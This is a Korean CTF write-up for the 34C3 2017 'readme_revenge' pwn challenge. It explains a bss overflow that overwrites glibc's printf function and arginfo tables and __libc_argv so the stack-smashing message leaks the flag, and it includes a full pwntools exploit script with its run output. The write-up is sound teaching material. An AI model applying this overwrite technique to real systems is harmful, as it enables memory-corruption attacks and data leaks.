# [2017_34C3CTF] \[PWN] readme_revenge

## Key words

* SSP leak
* printf structure
* buffer overflow

## Description

```
You can't own me if I don't use a libc! Right? Right?

Files: Link

Connect: nc 35.198.130.245 1337

Difficulty: easy-ish
```

## Solution

```
$ strings readme_revenge | grep 34C3
34C3_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

쉘 획득이 목적이 아니고 원격 바이너리 내의 플래그를 읽어와야 합니다.

```assembly
.text:0000000000400A0D                 push    rbp
.text:0000000000400A0E                 mov     rbp, rsp
.text:0000000000400A11                 lea     rsp, [rsp-1020h]
.text:0000000000400A19                 or      [rsp+1020h+var_1020], 0
.text:0000000000400A1E                 lea     rsp, [rsp+1020h]
.text:0000000000400A26                 lea     rsi, name
.text:0000000000400A2D                 lea     rdi, unk_48D184
.text:0000000000400A34                 mov     eax, 0
.text:0000000000400A39                 call    __isoc99_scanf
.text:0000000000400A3E                 lea     rsi, name
.text:0000000000400A45                 lea     rdi, aHiSBye    ; "Hi, %s. Bye.\n"
.text:0000000000400A4C                 mov     eax, 0
.text:0000000000400A51                 call    printf
.text:0000000000400A56                 mov     eax, 0
.text:0000000000400A5B                 pop     rbp
.text:0000000000400A5C                 retn
```

main 함수입니다. scanf를 통해 버퍼 오버플로우를 발생시킬 수 있습니다.

```
[*] flag                    : 0x6b4040
[*] name                    : 0x6b73e0
[*] __libc_argv             : 0x6b7980
[*] __printf_function_table : 0x6b7a28
[*] __printf_arginfo_table  : 0x6b7aa8
```

bss 영역에는 위와 같은 심볼이 존재하며 name에서 overflow를 발생시킬 수 있습니다. 이를 통해 bss 영역의 모든 변수를 제어할 수 있습니다.

```c
__printf (const char *format, ...)
{
  va_list arg;
  int done;

  va_start (arg, format);
  done = vfprintf (stdout, format, arg);
  va_end (arg);

  return done;
}
```

`glibc`의 `printf` 함수를 분석해야 합니다. `printf`에선 `vfprintf`를 호출합니다.(https://github.com/lattera/glibc/blob/master/stdio-common/printf.c)

```c
  if (__builtin_expect (__printf_function_table != NULL
			|| __printf_modifier_table != NULL
			|| __printf_va_arg_table != NULL, 0))
    goto do_positional;
```

`vfprintf`에서는 `__printf_function_table`이 `NULL`이 `do_positional`로 이동합니다.(https://github.com/lattera/glibc/blob/master/stdio-common/vfprintf.c)

```c
#ifdef COMPILE_WPRINTF
	nargs += __parse_one_specwc (f, nargs, &specs[nspecs], &max_ref_arg);
#else
	nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);
#endif
```

그 후, 파싱 함수를 호출합니다.

```c
  if (__builtin_expect (__printf_function_table == NULL, 1)
      || spec->info.spec > UCHAR_MAX
      || __printf_arginfo_table[spec->info.spec] == NULL
      /* We don't try to get the types for all arguments if the format
	 uses more than one.  The normal case is covered though.  If
	 the call returns -1 we continue with the normal specifiers.  */
      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
				   (&spec->info, 1, &spec->data_arg_type,
				    &spec->size)) < 0)
```

`__parse_one_specmb` 함수를 봅시다. `(*__printf_arginfo_table[spec->info.spec])` 포인터 함수가 호출 됩니다. 이를 통해 exploit 가능한데 함수의 인자 조작이 불가능합니다. 하지만 `__libc_argv`를 조작할 수 있기 때문에 Stack Smashing Protector message를 이용하여 flag를 leak하는 것이 가능합니다.

## Exploit

```python
from pwn import *
import sys

target = "./readme_revenge"
binary = ELF(target)

if len(sys.argv) == 1:
	r = process(target)
else:
	r = remote("35.198.130.245", 1337)

raw_input()

flag = binary.symbols['flag']
name = binary.symbols['name']
libc_argv = binary.symbols['__libc_argv']
func_table = binary.symbols['__printf_function_table']
arg_table = binary.symbols['__printf_arginfo_table']
log.info("flag                    : 0x%x" % flag)
log.info("name                    : 0x%x" % name)
log.info("__libc_argv             : 0x%x" % libc_argv)
log.info("__printf_function_table : 0x%x" % func_table)
log.info("__printf_arginfo_table  : 0x%x" % arg_table)

payload = p64(flag)
payload += "\x00" * 912
payload += p64(binary.symbols['__fortify_fail'])
payload += "a" * (libc_argv - name - len(payload))
payload += p64(name)
payload += "a" * (func_table - libc_argv - 8)
payload += p64(1)
payload += "\x00" * (arg_table - func_table - 8)
payload += p64(name)
r.sendline(payload)


r.interactive()
```

## 실행 결과

```
$ python ex.py 1
[*] '/home/delspon/labs/ctf/2017_34c3ctf/readme-revenge/readme_revenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 35.198.130.245 on port 1337: Done

[*] flag                    : 0x6b4040
[*] name                    : 0x6b73e0
[*] __libc_argv             : 0x6b7980
[*] __printf_function_table : 0x6b7a28
[*] __printf_arginfo_table  : 0x6b7aa8
[*] Switching to interactive mode
*** \xff\xff\xff\xff ***: 34C3_printf_1s_s0_fun_s0m3t1m3s!!11 terminated
======= Backtrace: =========
```

